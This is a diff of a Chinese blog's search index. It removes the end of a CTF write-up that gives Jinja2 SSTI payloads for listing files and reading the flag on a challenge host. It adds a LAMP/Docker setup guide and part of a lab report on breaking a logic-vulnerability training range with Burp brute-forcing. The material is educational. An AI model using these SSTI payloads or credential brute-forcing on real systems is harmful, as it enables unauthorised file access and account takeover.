class="string">&#x27;_json.Encoder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;json.decoder.JSONDecoder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;json.encoder.JSONEncoder&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;time.struct_time&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;threading._Verbose&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;cPickle.Unpickler&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;cPickle.Pickler&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;cStringIO.StringO&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;cStringIO.StringI&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;string.Template&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;string.Formatter&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_ssl._SSLContext&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_ssl._SSLSocket&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;socket._closedsocket&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_socket.socket&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;method_descriptor&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;socket._socketobject&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;socket._fileobject&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;urlparse.ResultMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;contextlib.GeneratorContextManager&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;contextlib.closing&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.utils.MissingType&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.utils.LRUCache&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.utils.Cycler&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.utils.Joiner&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.utils.Namespace&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;markupsafe._MarkupEscapeHelper&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.nodes.EvalContext&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_hashlib.HASH&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.nodes.Node&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_random.Random&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.runtime.TemplateReference&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.environment.Environment&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.runtime.Context&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.runtime.BlockReference&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.runtime.LoopContextBase&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.runtime.LoopContextIterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.runtime.Macro&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.runtime.Undefined&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;numbers.Number&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;decimal.Decimal&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;decimal._ContextManager&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;decimal.Context&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;decimal._WorkRep&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;decimal._Log10Memoize&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_ast.AST&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.lexer.Failure&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.lexer.TokenStreamIterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.lexer.TokenStream&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.lexer.Lexer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.parser.Parser&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.visitor.NodeVisitor&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.idtracking.Symbols&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.compiler.MacroRef&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.compiler.Frame&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.environment.Template&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.environment.TemplateModule&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.environment.TemplateExpression&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.environment.TemplateStream&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.loaders.BaseLoader&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_io._IOBase&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_io.IncrementalNewlineDecoder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.bccache.Bucket&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.bccache.BytecodeCache&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;logging.LogRecord&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;logging.Formatter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;logging.BufferingFormatter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;logging.Filter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;logging.Filterer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;logging.PlaceHolder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;logging.Manager&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;logging.LoggerAdapter&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;datetime.date&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;datetime.timedelta&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;datetime.time&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;datetime.tzinfo&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug._internal._Missing&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug._internal._DictAccessorProperty&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.datastructures.ImmutableListMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.datastructures.ImmutableDictMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.datastructures.UpdateDictMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.datastructures.ViewItems&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.datastructures._omd_bucket&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.datastructures.Headers&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.datastructures.ImmutableHeadersMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.datastructures.IfRange&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.datastructures.Range&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.datastructures.ContentRange&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.datastructures.FileStorage&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;email.LazyImporter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;calendar.Calendar&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.urls.Href&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.utils.HTMLBuilder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.accept.AcceptMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.auth.AuthorizationMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.auth.WWWAuthenticateMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wsgi.ClosingIterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wsgi.FileWrapper&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wsgi._RangeWrapper&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.middleware.dispatcher.DispatcherMiddleware&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.middleware.http_proxy.ProxyMiddleware&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.middleware.shared_data.SharedDataMiddleware&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.formparser.FormDataParser&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.formparser.MultiPartParser&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.base_request.BaseRequest&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.base_response.BaseResponse&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.common_descriptors.CommonRequestDescriptorsMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.common_descriptors.CommonResponseDescriptorsMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.etag.ETagRequestMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.etag.ETagResponseMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.user_agent.UserAgentMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.request.StreamOnlyMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.response.ResponseStream&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.response.ResponseStreamMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.exceptions.Aborter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;uuid.UUID&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;CArgObject&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_ctypes.CThunkObject&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_ctypes._CData&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_ctypes.CField&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_ctypes.DictRemover&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;ctypes.CDLL&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;ctypes.LibraryLoader&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;select.epoll&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;subprocess.Popen&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itsdangerous._json._CompactJSON&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itsdangerous.signer.SigningAlgorithm&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itsdangerous.signer.Signer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itsdangerous.serializer.Serializer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itsdangerous.url_safe.URLSafeSerializerMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask._compat._DeprecatedBool&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.local.Local&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.local.LocalStack&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.local.LocalManager&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.local.LocalProxy&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;ast.NodeVisitor&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;difflib.HtmlDiff&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.routing.RuleFactory&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.routing.RuleTemplate&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.routing.BaseConverter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.routing.Map&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.routing.MapAdapter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click._compat._FixupStream&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click._compat._AtomicFile&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.utils.LazyFile&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.utils.KeepOpenFile&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.utils.PacifyFlushWrapper&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.types.ParamType&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.parser.Option&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.parser.Argument&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.parser.ParsingState&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.parser.OptionParser&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.formatting.HelpFormatter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.core.Context&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.core.BaseCommand&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.core.Parameter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.signals.Namespace&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.signals._FakeSignal&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.helpers.locked_cached_property&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.helpers._PackageBoundObject&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.cli.DispatchingApp&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.cli.ScriptInfo&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.config.ConfigAttribute&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.ctx._AppCtxGlobals&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.ctx.AppContext&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.ctx.RequestContext&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.json.tag.JSONTag&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.json.tag.TaggedJSONSerializer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.sessions.SessionInterface&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.json._JSONModule&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.json.JSONMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.blueprints.BlueprintSetupState&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.serving.WSGIRequestHandler&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.ext.Extension&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.ext._CommentFinder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.serving._SSLContext&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.serving.BaseWSGIServer&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;unicodedata.UCD&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;array.array&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;method-wrapper&#x27;</span>&gt;] <span class="keyword">not</span> found</span><br></pre></td></tr></table></figure>
-
-<p>可以在其中找到 &lt;type ‘file’&gt;类型 (可以进行文件读取)，下标是40(此项前面有40个’,’)</p>
-<p><strong>还可以看到有一个 &lt;class ‘site._Printer’&gt;类型（可以进行命令执行）</strong>，下表是71，构造payload进行命令执行</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:50859/&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].listdir(&#x27;.&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>回显</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">URL http://61.147.171.105:50859/[&#x27;index.py&#x27;, &#x27;fl4g&#x27;] not found</span><br></pre></td></tr></table></figure>
-
-<p>接下来构造读取flag payload</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:50859/&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;fl4g&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>得到flag：</p>
-<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ctf</span>&#123;f22b6844-<span class="number">5169</span>-<span class="number">4054</span>-b2a0-d95b9361cb57&#125;</span><br></pre></td></tr></table></figure>
-
-
-
+    <title>记一次搭建LAMP web环境</title>
+    <url>/2023/11/04/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%90%AD%E5%BB%BALAMP%20web%E7%8E%AF%E5%A2%83/</url>
+    <content><![CDATA[<h1 id="搭建LAMP-web环境"><a href="#搭建LAMP-web环境" class="headerlink" title="搭建LAMP web环境"></a>搭建LAMP web环境</h1><h2 id="在虚拟机搭建web环境"><a href="#在虚拟机搭建web环境" class="headerlink" title="在虚拟机搭建web环境"></a>在虚拟机搭建web环境</h2><p>我的虚拟机系统是kali linux,里面已经有了Apache2和MySQL和PHP的环境</p>
+<p>终端输入<code>php -v</code>查看PHP版本</p>
+<p><img data-src="https://images.gaifagafin.top/202311051105539.png"></p>
+<p>终端输入<code>service Apache2 start</code> 启动Apache服务</p>
+<p>终端输入<code>service MySQL start</code> 启动MySQL服务</p>
+<p><img data-src="https://images.gaifagafin.top/202311051105283.png"></p>
+<p><img data-src="https://images.gaifagafin.top/202311051105413.png"></p>
+<p>然后终端分别输入<code>service Apache2 status</code>和<code>service MySQL status</code>查看服务状态</p>
+<p><img data-src="https://images.gaifagafin.top/202311051105653.png"></p>
+<p><img data-src="https://images.gaifagafin.top/202311051105983.png"></p>
+<p>服务正常启动</p>
+<p>接下来在网站测试服务是否可用</p>
+<p>linux浏览器输入localhost，若回显页面</p>
+<p><img data-src="https://images.gaifagafin.top/202311051105582.png"></p>
+<p>说明Apache服务正常</p>
+<p>接下来测试PHP服务，终端输入<code>cd /var/www/html</code></p>
+<p><img data-src="https://images.gaifagafin.top/202311051105350.png"></p>
+<p>在此目录下创建一个index.php文件，内容是phpinfo，输入<code>echo &#39;&lt;?php phpinfo(); ?&gt;&#39; &gt; index.php</code>(要在root权限下)</p>
+<p><img data-src="https://images.gaifagafin.top/202311051106523.png"></p>
+<p>接下来在浏览器输入<code>localhost/index.php</code>,成功看到回显，说明PHP服务正常</p>
+<p><img data-src="https://images.gaifagafin.top/202311051106180.png"></p>
+<p>以上做完说明web环境被成功搭建</p>
+<h2 id="在docker里搭建LAMP"><a href="#在docker里搭建LAMP" class="headerlink" title="在docker里搭建LAMP"></a>在docker里搭建LAMP</h2><p>在docker搭建lamp web环境，我这里选择拉取网上已经集成了MySQL服务和Apache服务的镜像(root权限下运行)</p>
+<p><img data-src="https://images.gaifagafin.top/202311051106639.png"></p>
+<p>这里我选择linode&#x2F;lamp,输入<code>docker pull linode/lamp</code></p>
+<p><img data-src="https://images.gaifagafin.top/202311051106325.png"></p>
+<p>输入<code>docker images</code>查看下载的镜像</p>
+<p><img data-src="https://images.gaifagafin.top/202311051106503.png"></p>
+<p>输入<code>docker run -tid -p 8080:80 -p 3309:3306 -v /var/www/html:/var/www/html --name lamp linode/lamp /bin/bash</code>创建容器(-p 参数是指定端口映射 ，-v参数是指定目录映射，–name 为此容器创建名字)</p>
+<p>创建成功后查看正在运行的容器<code>docker ps</code></p>
+<p><img data-src="https://images.gaifagafin.top/202311051106900.png"></p>
+<p>输入<code>docker exec -it 16b /bin/bash</code>进入容器(16b为容器id前3位)</p>
+<p><img data-src="https://images.gaifagafin.top/202311051106366.png"></p>
+<p>和之前一样开启Apache和MySQL服务</p>
+<p><img data-src="https://images.gaifagafin.top/202311051106049.png"></p>
+<p>在浏览器访问<code>localhost:8080</code>,如果出现无法访问的情况，则需要重启docker服务(exit退出容器)，退出容器后终端输入<code>systemctl restart docker</code></p>
+<p><img data-src="https://images.gaifagafin.top/202311051106627.png"></p>
+<p>再<code>docker start 容器id</code>，重复开启Apache和MySQL服务过程，在浏览器访问<code>localhost:8080</code>页面回显证明容器中的Apache服务成功运行</p>
+<p><img data-src="https://images.gaifagafin.top/202311051106455.png"></p>
+<p>接下来测试容器中PHP服务，容器中输入<code>cd var/www/example.com/public_html</code></p>
+<p><img data-src="https://images.gaifagafin.top/202311051106861.png"></p>
+<p>输入<code>&quot;&lt;?php phpinfo(); ?&gt;&quot; &gt; 1.php</code>将测试php文件写入当前目录下</p>
+<p><img data-src="https://images.gaifagafin.top/202311051107831.png"></p>
+<p>浏览器输入<code>http://localhost:8080/1.php</code>访问测试php文件，看到回显，说明PHP服务也正常</p>
+<p><img data-src="https://images.gaifagafin.top/202311051107278.png"></p>
+<p>以上做完则成功在docker中搭建了lamp web环境</p>
 ]]></content>
       <categories>
-        <category>CTF</category>
-        <category>CTF_Writeup</category>
+        <category>杂项</category>
       </categories>
       <tags>
-        <tag>CTF</tag>
-        <tag>Writeup</tag>
-        <tag>攻防世界</tag>
-        <tag>SSTI</tag>
+        <tag>Web</tag>
+        <tag>LAMP</tag>
+        <tag>环境</tag>
       </tags>
   </entry>
   <entry>
-    <title>记一次vimwiki安装及vim markDown的使用</title>
-    <url>/2023/11/24/%E8%AE%B0%E4%B8%80%E6%AC%A1vimwiki%E5%AE%89%E8%A3%85%E5%8F%8Avim-markDown%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
-    <content><![CDATA[<p>写这篇博客的缘由是我的Linux操作系统的老师布置的一项作业</p>
-<p><img data-src="https://images.gaifagafin.top/202311241242494.png"></p>
-<h1 id="vimwiki安装"><a href="#vimwiki安装" class="headerlink" title="vimwiki安装"></a>vimwiki安装</h1><p>这个是vimwiki的官方文档：<a href="https://github.com/vimwiki/vimwiki">vimwiki&#x2F;vimwiki: Personal Wiki for Vim (github.com)</a></p>
-<p>我采用的是<code>Vim packages</code>安装，查看官方文档↓</p>
-<img data-src="https://images.gaifagafin.top/202311241242416.png" style="zoom:80%;" />
+    <title>逻辑漏洞靶场环境——logic</title>
+    <url>/2023/12/02/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83%E2%80%94%E2%80%94logic/</url>
+    <content><![CDATA[<h1 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h1><p>漏洞环境：逻辑漏洞靶场环境——logic<br>要求提交实验报告<br>1.突破功能限制漏洞。要求突破查询按钮disable限制，获取编号：110010的查询内容（弹框中的flag）。<br>2.用户信息泄漏漏洞。通过回显信息，以暴力破解方式猜测系统中存在的两个用户名(提示：用户名以 “u” 开头)，并暴力破解这两个用户对应的密码。<br>3.越权漏洞。通过上一步破解的用户名密码登录，利用越权漏洞获取admin与admin1的个人信息。<br>4.遍历漏洞。已知当前系统中存在的一个学号为：20190504035XA01。利用遍历漏洞获取其他学号对应的成绩（不少于5条）。<br>5.暴力破解攻击。获取系统中另一个六位数字编号对应的弹框flag内容。</p>
+<h1 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h1><p>进入靶场文件目录下输入<code>docker-compose up -d</code>启动靶场，访问<code>http://192.168.37.128:8993</code>即可</p>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="突破功能限制漏洞"><a href="#突破功能限制漏洞" class="headerlink" title="突破功能限制漏洞"></a>突破功能限制漏洞</h2><p>查询按钮是灰色的，无法被点击</p>
+<p><img data-src="https://images.gaifagafin.top/202312022048006.png"></p>
+<p>按F12进入查看器，定位到按钮的前端功能实现，将<code>disable=&quot;disable&quot;</code>删除后点击查询</p>
+<p><img data-src="https://images.gaifagafin.top/202312022048806.png"></p>
+<p>弹窗获得FLAG：<code>flag&#123;byp4ss1s_ez&#125;</code></p>
+<p><img data-src="https://images.gaifagafin.top/202312022049066.png"></p>
+<h2 id="用户信息泄漏漏洞"><a href="#用户信息泄漏漏洞" class="headerlink" title="用户信息泄漏漏洞"></a>用户信息泄漏漏洞</h2><p>随便输入用户名和密码，提示用户名不正确</p>
+<p><img data-src="https://images.gaifagafin.top/202312022049396.png"></p>
+<p>burpsuite开启代理</p>
+<p><img data-src="https://images.gaifagafin.top/202312022049002.png"></p>
+<p>将请求包发送给intruder，对用户名进行爆破，得到用户名如下</p>
+<p><img data-src="https://images.gaifagafin.top/202312022049622.png"></p>
+<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#爆破出的用户名</span></span><br><span class="line"><span class="keyword">user</span></span><br><span class="line"><span class="title">user1</span></span><br><span class="line">admin</span><br><span class="line">admin1</span><br></pre></td></tr></table></figure>
 
-<h2 id="vimsrc配置"><a href="#vimsrc配置" class="headerlink" title="vimsrc配置"></a>vimsrc配置</h2><p>查看一下vim的<strong>版本</strong></p>
-<p>终端输入<code>vim -v</code>即可查看，我的版本是9.0.1378</p>
-<img data-src="https://images.gaifagafin.top/202311241242329.png" style="zoom:67%;" />
+<p>将爆出的用户名装载进有效负载集，爆破密码</p>
+<p><img data-src="https://images.gaifagafin.top/202312022049648.png"></p>
+<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#爆破出的用户名及密码</span></span><br><span class="line"><span class="keyword">user</span>	<span class="title">888888</span></span><br><span class="line">user1	<span class="number">123456</span></span><br></pre></td></tr></table></figure>
 
-<p>确认版本符合要求后要将vim的配置文件<code>vimrc</code>修改，我的vimrc文件在<code>/etc/vim/vimrc</code>，管理员权限输入</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi /etc/vim/vimrc</span><br></pre></td></tr></table></figure>
+<p>使用爆破出的用户名及密码成功登录</p>
+<p><img data-src="https://images.gaifagafin.top/202312022049308.png"></p>
+<p><img data-src="https://images.gaifagafin.top/202312022049817.png"></p>
